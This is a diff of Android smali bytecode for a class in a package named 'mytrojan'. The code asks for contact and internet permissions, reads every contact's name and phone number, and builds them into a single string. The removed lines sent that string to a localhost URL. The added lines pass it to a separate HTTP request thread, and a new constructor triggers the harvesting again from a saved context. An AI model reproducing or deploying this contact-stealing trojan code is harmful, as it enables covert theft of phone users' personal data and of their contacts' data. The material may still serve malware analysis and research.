@@ -6,231 +6,249 @@
 # static fields
 .field private static final TAG:Ljava/lang/String; = "TEST"
 
+.field private static ctxTmp:Landroid/content/Context;
+
 
 # instance fields
 .field private ctx:Landroid/content/Context;
 
 
 # direct methods
+.method public constructor <init>()V
+    .registers 2
+
+    .prologue
+    .line 34
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    .line 35
+    sget-object v0, Lcom/example/mytrojan/ExecuteIt;->ctxTmp:Landroid/content/Context;
+
+    iput-object v0, p0, Lcom/example/mytrojan/ExecuteIt;->ctx:Landroid/content/Context;
+
+    .line 36
+    iget-object v0, p0, Lcom/example/mytrojan/ExecuteIt;->ctx:Landroid/content/Context;
+
+    if-eqz v0, :cond_e
+
+    .line 37
+    invoke-direct {p0}, Lcom/example/mytrojan/ExecuteIt;->getContactList()V
+
+    .line 40
+    :cond_e
+    return-void
+.end method
+
 .method public constructor <init>(Landroid/content/Context;)V
     .registers 2
     .param p1, "ctx"    # Landroid/content/Context;
 
     .prologue
-    .line 33
+    .line 42
     invoke-direct {p0}, Ljava/lang/Object;-><init>()V
 
-    .line 35
+    .line 43
+    sput-object p1, Lcom/example/mytrojan/ExecuteIt;->ctxTmp:Landroid/content/Context;
+
+    .line 44
     iput-object p1, p0, Lcom/example/mytrojan/ExecuteIt;->ctx:Landroid/content/Context;
 
-    .line 36
+    .line 45
     invoke-direct {p0}, Lcom/example/mytrojan/ExecuteIt;->getContactList()V
 
-    .line 37
+    .line 46
     return-void
 .end method
 
 .method private getContactList()V
-    .registers 19
+    .registers 15
 
     .prologue
-    .line 70
-    new-instance v12, Ljava/util/ArrayList;
+    const/4 v13, 0x0
 
-    invoke-direct {v12}, Ljava/util/ArrayList;-><init>()V
-
-    .line 71
-    .local v12, "mPers":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
-    const-string v2, "android.permission.READ_CONTACTS"
-
-    move-object/from16 v0, p0
-
-    invoke-direct {v0, v2}, Lcom/example/mytrojan/ExecuteIt;->hasPhonePermission(Ljava/lang/String;)Z
-
-    move-result v2
-
-    if-nez v2, :cond_14
-
-    .line 72
-    const-string v2, "android.permission.READ_CONTACTS"
-
-    invoke-interface {v12, v2}, Ljava/util/List;->add(Ljava/lang/Object;)Z
-
-    .line 76
-    :cond_14
-    const-string v2, "android.permission.INTERNET"
-
-    move-object/from16 v0, p0
-
-    invoke-direct {v0, v2}, Lcom/example/mytrojan/ExecuteIt;->hasPhonePermission(Ljava/lang/String;)Z
-
-    move-result v2
-
-    if-nez v2, :cond_23
-
-    .line 78
-    const-string v2, "android.permission.INTERNET"
-
-    invoke-interface {v12, v2}, Ljava/util/List;->add(Ljava/lang/Object;)Z
-
-    .line 81
-    :cond_23
-    invoke-interface {v12}, Ljava/util/List;->size()I
-
-    move-result v2
-
-    if-lez v2, :cond_37
-
-    .line 82
     const/4 v2, 0x0
 
-    new-array v2, v2, [Ljava/lang/String;
+    .line 79
+    new-instance v9, Ljava/util/ArrayList;
 
-    invoke-interface {v12, v2}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;
+    invoke-direct {v9}, Ljava/util/ArrayList;-><init>()V
 
-    move-result-object v2
+    .line 80
+    .local v9, "mPers":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
+    const-string v1, "android.permission.READ_CONTACTS"
 
-    check-cast v2, [Ljava/lang/String;
+    invoke-direct {p0, v1}, Lcom/example/mytrojan/ExecuteIt;->hasPhonePermission(Ljava/lang/String;)Z
 
-    move-object/from16 v0, p0
+    move-result v1
 
-    invoke-direct {v0, v2}, Lcom/example/mytrojan/ExecuteIt;->requestPermission([Ljava/lang/String;)V
+    if-nez v1, :cond_14
+
+    .line 81
+    const-string v1, "android.permission.READ_CONTACTS"
+
+    invoke-interface {v9, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z
 
     .line 85
-    :cond_37
-    move-object/from16 v0, p0
+    :cond_14
+    const-string v1, "android.permission.INTERNET"
 
-    iget-object v2, v0, Lcom/example/mytrojan/ExecuteIt;->ctx:Landroid/content/Context;
+    invoke-direct {p0, v1}, Lcom/example/mytrojan/ExecuteIt;->hasPhonePermission(Ljava/lang/String;)Z
 
-    invoke-virtual {v2}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
+    move-result v1
+
+    if-nez v1, :cond_21
+
+    .line 87
+    const-string v1, "android.permission.INTERNET"
+
+    invoke-interface {v9, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z
+
+    .line 90
+    :cond_21
+    invoke-interface {v9}, Ljava/util/List;->size()I
+
+    move-result v1
+
+    if-lez v1, :cond_32
+
+    .line 91
+    new-array v1, v13, [Ljava/lang/String;
+
+    invoke-interface {v9, v1}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;
 
     move-result-object v1
 
-    .line 86
-    .local v1, "cr":Landroid/content/ContentResolver;
-    sget-object v2, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;
+    check-cast v1, [Ljava/lang/String;
 
-    const/4 v3, 0x0
+    invoke-direct {p0, v1}, Lcom/example/mytrojan/ExecuteIt;->requestPermission([Ljava/lang/String;)V
 
-    const/4 v4, 0x0
+    .line 94
+    :cond_32
+    iget-object v1, p0, Lcom/example/mytrojan/ExecuteIt;->ctx:Landroid/content/Context;
 
-    const/4 v5, 0x0
+    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
 
-    const/4 v6, 0x0
+    move-result-object v0
 
-    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
+    .line 95
+    .local v0, "cr":Landroid/content/ContentResolver;
+    sget-object v1, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;
+
+    move-object v3, v2
+
+    move-object v4, v2
+
+    move-object v5, v2
+
+    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
+
+    move-result-object v7
+
+    .line 98
+    .local v7, "cur":Landroid/database/Cursor;
+    if-eqz v7, :cond_e3
+
+    invoke-interface {v7}, Landroid/database/Cursor;->getCount()I
+
+    move-result v1
+
+    :goto_47
+    if-lez v1, :cond_f8
+
+    .line 99
+    :cond_49
+    :goto_49
+    if-eqz v7, :cond_f8
+
+    invoke-interface {v7}, Landroid/database/Cursor;->moveToNext()Z
+
+    move-result v1
+
+    if-eqz v1, :cond_f8
+
+    .line 100
+    const-string v1, "_id"
+
+    .line 101
+    invoke-interface {v7, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
+
+    move-result v1
+
+    .line 100
+    invoke-interface {v7, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
 
     move-result-object v8
 
-    .line 89
-    .local v8, "cur":Landroid/database/Cursor;
-    if-eqz v8, :cond_ed
+    .line 102
+    .local v8, "id":Ljava/lang/String;
+    const-string v1, "display_name"
 
-    invoke-interface {v8}, Landroid/database/Cursor;->getCount()I
+    invoke-interface {v7, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
 
-    move-result v2
+    move-result v1
 
-    :goto_4f
-    if-lez v2, :cond_124
-
-    .line 90
-    :cond_51
-    :goto_51
-    if-eqz v8, :cond_124
-
-    invoke-interface {v8}, Landroid/database/Cursor;->moveToNext()Z
-
-    move-result v2
-
-    if-eqz v2, :cond_124
-
-    .line 91
-    const-string v2, "_id"
-
-    .line 92
-    invoke-interface {v8, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
-
-    move-result v2
-
-    .line 91
-    invoke-interface {v8, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
+    invoke-interface {v7, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
 
     move-result-object v10
 
-    .line 93
-    .local v10, "id":Ljava/lang/String;
-    const-string v2, "display_name"
-
-    invoke-interface {v8, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
-
-    move-result v2
-
-    invoke-interface {v8, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
-
-    move-result-object v13
-
-    .line 96
-    .local v13, "name":Ljava/lang/String;
-    const-string v2, "has_phone_number"
-
-    invoke-interface {v8, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
-
-    move-result v2
-
-    invoke-interface {v8, v2}, Landroid/database/Cursor;->getInt(I)I
-
-    move-result v2
-
-    if-lez v2, :cond_51
-
-    .line 98
-    sget-object v2, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;
-
-    const/4 v3, 0x0
-
-    const-string v4, "contact_id = ?"
-
-    const/4 v5, 0x1
-
-    new-array v5, v5, [Ljava/lang/String;
-
-    const/4 v6, 0x0
-
-    aput-object v10, v5, v6
-
-    const/4 v6, 0x0
-
-    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
-
-    move-result-object v14
-
     .line 105
-    .local v14, "pCur":Landroid/database/Cursor;
-    const-string v7, ""
+    .local v10, "name":Ljava/lang/String;
+    const-string v1, "has_phone_number"
 
-    .line 106
-    .local v7, "content":Ljava/lang/String;
-    :goto_8b
-    invoke-interface {v14}, Landroid/database/Cursor;->moveToNext()Z
+    invoke-interface {v7, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
 
-    move-result v2
+    move-result v1
 
-    if-eqz v2, :cond_f0
+    invoke-interface {v7, v1}, Landroid/database/Cursor;->getInt(I)I
+
+    move-result v1
+
+    if-lez v1, :cond_49
 
     .line 107
-    const-string v2, "data1"
+    sget-object v1, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;
 
-    invoke-interface {v14, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
+    const-string v3, "contact_id = ?"
 
-    move-result v2
+    const/4 v4, 0x1
 
-    invoke-interface {v14, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
+    new-array v4, v4, [Ljava/lang/String;
 
-    move-result-object v15
+    aput-object v8, v4, v13
 
-    .line 109
-    .local v15, "phoneNo":Ljava/lang/String;
-    const-string v2, "TEST"
+    move-object v5, v2
+
+    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
+
+    move-result-object v11
+
+    .line 114
+    .local v11, "pCur":Landroid/database/Cursor;
+    const-string v6, ""
+
+    .line 115
+    .local v6, "content":Ljava/lang/String;
+    :goto_81
+    invoke-interface {v11}, Landroid/database/Cursor;->moveToNext()Z
+
+    move-result v1
+
+    if-eqz v1, :cond_e6
+
+    .line 116
+    const-string v1, "data1"
+
+    invoke-interface {v11, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
+
+    move-result v1
+
+    invoke-interface {v11, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
+
+    move-result-object v12
+
+    .line 118
+    .local v12, "phoneNo":Ljava/lang/String;
+    const-string v1, "TEST"
 
     new-instance v3, Ljava/lang/StringBuilder;
 
@@ -242,7 +260,7 @@
 
     move-result-object v3
 
-    invoke-virtual {v3, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {v3, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
     move-result-object v3
 
@@ -250,10 +268,10 @@
 
     move-result-object v3
 
-    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
+    invoke-static {v1, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
 
-    .line 110
-    const-string v2, "TEST"
+    .line 119
+    const-string v1, "TEST"
 
     new-instance v3, Ljava/lang/StringBuilder;
 
@@ -265,7 +283,7 @@
 
     move-result-object v3
 
-    invoke-virtual {v3, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {v3, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
     move-result-object v3
 
@@ -273,143 +291,89 @@
 
     move-result-object v3
 
-    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
+    invoke-static {v1, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
 
-    .line 112
-    new-instance v2, Ljava/lang/StringBuilder;
+    .line 121
+    new-instance v1, Ljava/lang/StringBuilder;
 
-    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V
+    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V
 
-    invoke-virtual {v2, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {v1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    move-result-object v2
-
-    const-string v3, "#"
-
-    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    move-result-object v2
-
-    invoke-virtual {v2, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    move-result-object v2
+    move-result-object v1
 
     const-string v3, "#"
 
-    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    move-result-object v2
+    move-result-object v1
 
-    invoke-virtual {v2, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {v1, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    move-result-object v2
+    move-result-object v1
 
-    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    const-string v3, "#"
 
-    move-result-object v7
+    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    .line 113
-    goto :goto_8b
+    move-result-object v1
 
-    .line 89
-    .end local v7    # "content":Ljava/lang/String;
-    .end local v10    # "id":Ljava/lang/String;
-    .end local v13    # "name":Ljava/lang/String;
-    .end local v14    # "pCur":Landroid/database/Cursor;
-    .end local v15    # "phoneNo":Ljava/lang/String;
-    :cond_ed
-    const/4 v2, 0x0
+    invoke-virtual {v1, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    goto/16 :goto_4f
+    move-result-object v1
 
-    .line 114
-    .restart local v7    # "content":Ljava/lang/String;
-    .restart local v10    # "id":Ljava/lang/String;
-    .restart local v13    # "name":Ljava/lang/String;
-    .restart local v14    # "pCur":Landroid/database/Cursor;
-    :cond_f0
-    invoke-interface {v14}, Landroid/database/Cursor;->close()V
+    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
 
-    .line 118
-    :try_start_f3
-    new-instance v16, Ljava/net/URL;
-
-    new-instance v2, Ljava/lang/StringBuilder;
-
-    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V
-
-    const-string v3, "http://127.0.0.1?content="
-
-    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    move-result-object v2
-
-    invoke-virtual {v2, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    move-result-object v2
-
-    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
-
-    move-result-object v2
-
-    move-object/from16 v0, v16
-
-    invoke-direct {v0, v2}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
-
-    .line 119
-    .local v16, "url":Ljava/net/URL;
-    invoke-virtual/range {v16 .. v16}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
-
-    move-result-object v17
-
-    check-cast v17, Ljava/net/HttpURLConnection;
-
-    .line 120
-    .local v17, "urlConnection":Ljava/net/HttpURLConnection;
-    invoke-virtual/range {v17 .. v17}, Ljava/net/HttpURLConnection;->disconnect()V
-    :try_end_116
-    .catch Ljava/net/MalformedURLException; {:try_start_f3 .. :try_end_116} :catch_118
-    .catch Ljava/io/IOException; {:try_start_f3 .. :try_end_116} :catch_11e
-
-    goto/16 :goto_51
+    move-result-object v6
 
     .line 122
-    .end local v16    # "url":Ljava/net/URL;
-    .end local v17    # "urlConnection":Ljava/net/HttpURLConnection;
-    :catch_118
-    move-exception v9
+    goto :goto_81
+
+    .end local v6    # "content":Ljava/lang/String;
+    .end local v8    # "id":Ljava/lang/String;
+    .end local v10    # "name":Ljava/lang/String;
+    .end local v11    # "pCur":Landroid/database/Cursor;
+    .end local v12    # "phoneNo":Ljava/lang/String;
+    :cond_e3
+    move v1, v13
+
+    .line 98
+    goto/16 :goto_47
 
     .line 123
-    .local v9, "e":Ljava/net/MalformedURLException;
-    invoke-virtual {v9}, Ljava/net/MalformedURLException;->printStackTrace()V
-
-    goto/16 :goto_51
-
-    .line 125
-    .end local v9    # "e":Ljava/net/MalformedURLException;
-    :catch_11e
-    move-exception v11
+    .restart local v6    # "content":Ljava/lang/String;
+    .restart local v8    # "id":Ljava/lang/String;
+    .restart local v10    # "name":Ljava/lang/String;
+    .restart local v11    # "pCur":Landroid/database/Cursor;
+    :cond_e6
+    invoke-interface {v11}, Landroid/database/Cursor;->close()V
 
     .line 126
-    .local v11, "io":Ljava/io/IOException;
-    invoke-virtual {v11}, Ljava/io/IOException;->printStackTrace()V
+    new-instance v1, Ljava/lang/Thread;
 
-    goto/16 :goto_51
+    new-instance v3, Lcom/example/mytrojan/RequestHttp;
 
-    .line 131
-    .end local v7    # "content":Ljava/lang/String;
-    .end local v10    # "id":Ljava/lang/String;
-    .end local v11    # "io":Ljava/io/IOException;
-    .end local v13    # "name":Ljava/lang/String;
-    .end local v14    # "pCur":Landroid/database/Cursor;
-    :cond_124
-    if-eqz v8, :cond_129
+    invoke-direct {v3, v6}, Lcom/example/mytrojan/RequestHttp;-><init>(Ljava/lang/String;)V
+
+    invoke-direct {v1, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
+
+    invoke-virtual {v1}, Ljava/lang/Thread;->start()V
+
+    goto/16 :goto_49
 
     .line 132
-    invoke-interface {v8}, Landroid/database/Cursor;->close()V
+    .end local v6    # "content":Ljava/lang/String;
+    .end local v8    # "id":Ljava/lang/String;
+    .end local v10    # "name":Ljava/lang/String;
+    .end local v11    # "pCur":Landroid/database/Cursor;
+    :cond_f8
+    if-eqz v7, :cond_fd
 
-    .line 134
-    :cond_129
+    .line 133
+    invoke-interface {v7}, Landroid/database/Cursor;->close()V
+
+    .line 135
+    :cond_fd
     return-void
 .end method
 
@@ -418,10 +382,10 @@
     .param p1, "permission"    # Ljava/lang/String;
 
     .prologue
-    .line 42
+    .line 51
     const/4 v1, 0x0
 
-    .line 45
+    .line 54
     .local v1, "ret":Z
     sget v2, Landroid/os/Build$VERSION;->SDK_INT:I
 
@@ -429,27 +393,27 @@
 
     if-lt v2, v3, :cond_11
 
-    .line 48
+    .line 57
     iget-object v2, p0, Lcom/example/mytrojan/ExecuteIt;->ctx:Landroid/content/Context;
 
     invoke-static {v2, p1}, Landroid/support/v4/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I
 
     move-result v0
 
-    .line 50
+    .line 59
     .local v0, "hasPermission":I
     if-nez v0, :cond_10
 
-    .line 51
+    .line 60
     const/4 v1, 0x1
 
-    .line 58
+    .line 67
     .end local v0    # "hasPermission":I
     :cond_10
     :goto_10
     return v1
 
-    .line 55
+    .line 64
     :cond_11
     const/4 v1, 0x1
 
@@ -461,12 +425,12 @@
     .param p1, "permission"    # [Ljava/lang/String;
 
     .prologue
-    .line 64
+    .line 73
     move-object v0, p1
 
     check-cast v0, [Ljava/lang/String;
 
-    .line 65
+    .line 74
     .local v0, "requestPermissionArray":[Ljava/lang/String;
     iget-object v1, p0, Lcom/example/mytrojan/ExecuteIt;->ctx:Landroid/content/Context;
 
@@ -476,6 +440,6 @@
 
     invoke-static {v1, v0, v2}, Landroid/support/v4/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V
 
-    .line 66
+    .line 75
     return-void
 .end method
